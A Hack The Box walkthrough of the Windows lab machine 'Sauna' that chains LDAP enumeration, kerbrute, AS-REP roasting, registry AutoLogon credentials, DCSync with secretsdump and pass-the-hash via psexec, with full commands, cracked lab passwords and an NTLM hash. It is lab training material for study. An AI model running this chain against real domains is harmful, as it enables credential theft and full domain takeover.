---
title: "HTB: Sauna"
date: 2023-10-10
draft: false
os: "Windows"
difficulty: "Easy"
platform: "HTB"
aliases: ["/posts/htb/sauna/"]
tags:
  - htb
  - easy
  - windows
  - active-directory
  - as-rep-roasting
  - dcsync
  - bloodhound
  - ldap
  - autologon
categories:
  - walkthrough
---

{{< box-info name="Sauna" os="Windows" difficulty="Easy" ip="10.129.93.188" platform="HTB" >}}

---

## Enumeration

### Nmap

{{< collapse title="Nmap output" >}}
```
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
```
{{< /collapse >}}

Classic AD box -- Kerberos, LDAP, SMB, WinRM all present. Domain: `EGOTISTICAL-BANK.LOCAL`.

### LDAP Enumeration

Anonymous bind is allowed, which leaks directory objects:

```bash
ldapsearch -x -H ldap://10.129.93.188 -b 'DC=egotistical-bank,DC=local'
```

This reveals a user `Hugo Smith`, hinting at naming conventions like `hsmith`.

### Kerbrute - User Enumeration

```bash
./kerbrute userenum -d EGOTISTICAL-BANK.LOCAL --dc 10.129.93.188 \
  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

[+] VALID USERNAME: administrator@EGOTISTICAL-BANK.LOCAL
[+] VALID USERNAME: hsmith@EGOTISTICAL-BANK.LOCAL
[+] VALID USERNAME: fsmith@EGOTISTICAL-BANK.LOCAL
```

---

## Foothold

### AS-REP Roasting

With valid usernames, attempt AS-REP roasting -- `fsmith` doesn't require pre-authentication:

```bash
impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/fsmith \
  -format john -outputfile hashes.asreproast \
  -dc-ip 10.129.93.188 -no-pass
```

Crack it:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.asreproast

Thestrokes23     ($krb5asrep$fsmith@EGOTISTICAL-BANK.LOCAL)
```

Credentials: `fsmith:Thestrokes23` -- WinRM access confirmed.

---

## Lateral Movement

### AutoLogon Credentials → svc_loanmgr

WinPEAS finds AutoLogon credentials stored in the registry:

```
DefaultDomainName  : EGOTISTICALBANK
DefaultUserName    : EGOTISTICALBANK\svc_loanmanager
DefaultPassword    : Moneymakestheworldgoround!
```

Gotcha here: the account name in the registry is `svc_loanmanager`, but the actual SAM account name is `svc_loanmgr`. Trying the full name fails -- you need to check the `C:\Users` directory to spot the real name.

---

## Privilege Escalation

### DCSync

Running BloodHound/SharpHound reveals that `svc_loanmgr` has both `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` on the domain -- DCSync capable.

```bash
impacket-secretsdump 'EGOTISTICAL-BANK.LOCAL/svc_loanmgr:Moneymakestheworldgoround!@10.129.93.188'

Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
```

Pass-the-hash to SYSTEM:

```bash
psexec EGOTISTICAL-BANK.LOCAL/administrator@10.129.93.188 \
  -hashes 'aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e'
```

---

## Proof

{{< terminal title="root@sauna" >}}
C:\Users> whoami
nt authority\system
{{< /terminal >}}

---

## Key Takeaways

{{< callout type="note" >}}
- LDAP anonymous bind can leak enough info to enumerate valid usernames for Kerberos attacks
- Always try AS-REP roasting when you have valid usernames -- it only takes one account without pre-auth
- AutoLogon credentials in the registry are a common lateral movement vector -- but verify the actual account name vs what's stored
- DCSync rights on a service account is game over for the domain -- always check replication privileges in BloodHound
{{< /callout >}}
